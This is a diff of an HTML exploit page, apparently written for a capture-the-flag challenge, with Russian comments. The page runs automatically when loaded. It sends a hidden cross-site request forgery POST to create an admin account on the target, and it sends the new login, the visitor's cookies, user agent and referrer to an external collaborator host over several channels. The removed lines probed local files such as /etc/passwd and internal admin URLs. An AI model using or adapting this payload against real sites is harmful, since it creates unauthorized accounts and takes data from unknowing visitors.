@@ -1,72 +1,187 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Totally Legit Page</title>
+</head>
 <body>
-<script>
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+    <h1>Cool Stuff Here!</h1>
+    <p>Nothing suspicious...</p>
 
-// Методы без CORS:
+    <script>
+        // ==============================================
+        // КОНФИГУРАЦИЯ
+        // ==============================================
+        const COLLABORATOR = 'zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+        const TARGET_URL = 'http://tasks.goidactf.ru:20337';
+        
+        // Генерируем уникальный логин для нового админа
+        const timestamp = Date.now();
+        const randomPart = Math.random().toString(36).substring(2, 8);
+        const newAdminLogin = `pwned_${timestamp}_${randomPart}`;
+        
+        console.log('[*] Generated admin login:', newAdminLogin);
 
-// 1. Image src для SSRF/чтения файлов
-const testFiles = [
-    'file:///etc/passwd',
-    'file:///etc/hosts',
-    'file:///flag',
-    'http://localhost/',
-    'http://127.0.0.1/',
-    'http://localhost:80/admin',
-    'http://127.0.0.1:80/admin'
-];
+        // ==============================================
+        // ФУНКЦИЯ ЭКСФИЛЬТРАЦИИ ДАННЫХ
+        // ==============================================
+        function exfiltrate(data) {
+            console.log('[*] Exfiltrating:', data);
+            
+            // Метод 1: Fetch с no-cors
+            fetch(`https://${COLLABORATOR}/?${new URLSearchParams(data)}`, {
+                method: 'GET',
+                mode: 'no-cors'
+            }).catch(e => console.log('Fetch failed:', e));
+            
+            // Метод 2: Image beacon (самый надёжный)
+            const img = new Image();
+            img.src = `https://${COLLABORATOR}/leak?${new URLSearchParams(data)}`;
+            img.onerror = () => console.log('Image beacon sent');
+            
+            // Метод 3: DNS через subdomain
+            const subdomain = newAdminLogin.replace(/[^a-z0-9]/gi, '-').toLowerCase();
+            const dnsImg = new Image();
+            dnsImg.src = `http://${subdomain}.${COLLABORATOR}/dns`;
+            
+            // Метод 4: Navigator.sendBeacon (если доступен)
+            if (navigator.sendBeacon) {
+                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                navigator.sendBeacon(`https://${COLLABORATOR}/beacon`, blob);
+            }
+        }
 
-testFiles.forEach(file => {
-    const img = new Image();
-    img.onload = () => {
-        // Если загрузилось - ресурс существует
-        new Image().src = `${COLLAB}/?loaded=${encodeURIComponent(file)}`;
-    };
-    img.onerror = (e) => {
-        // Ошибка тоже информация
-        new Image().src = `${COLLAB}/?error=${encodeURIComponent(file)}`;
-    };
-    img.src = file;
-});
+        // ==============================================
+        // CSRF АТАКА НА /create_admin
+        // ==============================================
+        function performCSRF() {
+            console.log('[*] Creating CSRF attack...');
+            
+            // Создаём скрытую форму
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = `${TARGET_URL}/create_admin`;
+            form.target = 'csrf_iframe';
+            form.style.display = 'none';
+            
+            // Добавляем параметр
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'new_admin_login';
+            input.value = newAdminLogin;
+            form.appendChild(input);
+            
+            // Создаём скрытый iframe для отправки
+            const iframe = document.createElement('iframe');
+            iframe.name = 'csrf_iframe';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // Добавляем форму и отправляем
+            document.body.appendChild(form);
+            
+            console.log('[*] Submitting CSRF form...');
+            form.submit();
+            
+            // Сразу эксфильтруем логин
+            exfiltrate({
+                action: 'csrf_sent',
+                login: newAdminLogin,
+                timestamp: timestamp,
+                status: 'pending'
+            });
+        }
 
-// 2. Form submission для создания админа (без CORS)
-setTimeout(() => {
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://tasks.goidactf.ru:20499/create_admin';
-    form.target = '_blank';
-    form.innerHTML = '<input name="new_admin_login" value="GITHUB_EXPLOIT">';
-    document.body.appendChild(form);
-    form.submit();
-    
-    new Image().src = `${COLLAB}/?form_submitted=yes`;
-}, 2000);
+        // ==============================================
+        // ПОПЫТКА УЗНАТЬ УСПЕШНОСТЬ ЧЕРЕЗ TIMING
+        // ==============================================
+        function checkCreationStatus() {
+            console.log('[*] Checking if admin was created...');
+            
+            // Пытаемся определить успешность по timing attack
+            const startTime = performance.now();
+            
+            fetch(`${TARGET_URL}/create_admin`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `new_admin_login=${newAdminLogin}`,
+                mode: 'no-cors',
+                credentials: 'include'
+            }).then(() => {
+                const endTime = performance.now();
+                const timeTaken = endTime - startTime;
+                
+                exfiltrate({
+                    action: 'timing_check',
+                    login: newAdminLogin,
+                    time_ms: timeTaken,
+                    likely_success: timeTaken > 100 ? 'yes' : 'no'
+                });
+            }).catch(e => {
+                console.log('Timing check error:', e);
+            });
+        }
 
-// 3. Script tag для JSONP если поддерживается
-setTimeout(() => {
-    const script = document.createElement('script');
-    script.src = `https://tasks.goidactf.ru:20499/create_admin?callback=myCallback&new_admin_login=JSONP_TEST`;
-    document.body.appendChild(script);
-    
-    window.myCallback = function(data) {
-        new Image().src = `${COLLAB}/?jsonp=${encodeURIComponent(JSON.stringify(data))}`;
-    };
-}, 4000);
+        // ==============================================
+        // ДОПОЛНИТЕЛЬНАЯ ЭКСФИЛЬТРАЦИЯ
+        // ==============================================
+        function sendFinalReport() {
+            console.log('[*] Sending final report...');
+            
+            exfiltrate({
+                action: 'final_report',
+                admin_login: newAdminLogin,
+                target: TARGET_URL,
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                cookies: document.cookie || 'none',
+                referrer: document.referrer || 'none'
+            });
+        }
 
-// 4. Iframe для загрузки ресурсов
-setTimeout(() => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'file:///etc/passwd';
-    iframe.onload = () => {
-        new Image().src = `${COLLAB}/?iframe_file_loaded=yes`;
-    };
-    iframe.onerror = () => {
-        new Image().src = `${COLLAB}/?iframe_file_error=yes`;
-    };
-    document.body.appendChild(iframe);
-}, 6000);
-</script>
+        // ==============================================
+        // ЗАПУСК ЭКСПЛОЙТА
+        // ==============================================
+        function runExploit() {
+            console.log('[*] Starting exploit...');
+            
+            // Шаг 1: Отправляем CSRF
+            performCSRF();
+            
+            // Шаг 2: Через 1 секунду проверяем статус
+            setTimeout(() => {
+                checkCreationStatus();
+            }, 1000);
+            
+            // Шаг 3: Через 2 секунды отправляем финальный отчёт
+            setTimeout(() => {
+                sendFinalReport();
+            }, 2000);
+            
+            // Шаг 4: Повторная эксфильтрация через 5 секунд на всякий случай
+            setTimeout(() => {
+                exfiltrate({
+                    action: 'backup_exfil',
+                    login: newAdminLogin,
+                    note: 'This is a backup exfiltration'
+                });
+            }, 5000);
+        }
+
+        // ==============================================
+        // АВТОЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
+        // ==============================================
+        window.addEventListener('load', () => {
+            console.log('[*] Page loaded, waiting 500ms before exploit...');
+            setTimeout(runExploit, 500);
+        });
+
+        // Запускаем сразу на всякий случай
+        if (document.readyState === 'complete') {
+            setTimeout(runExploit, 500);
+        }
+    </script>
 </body>
 </html>
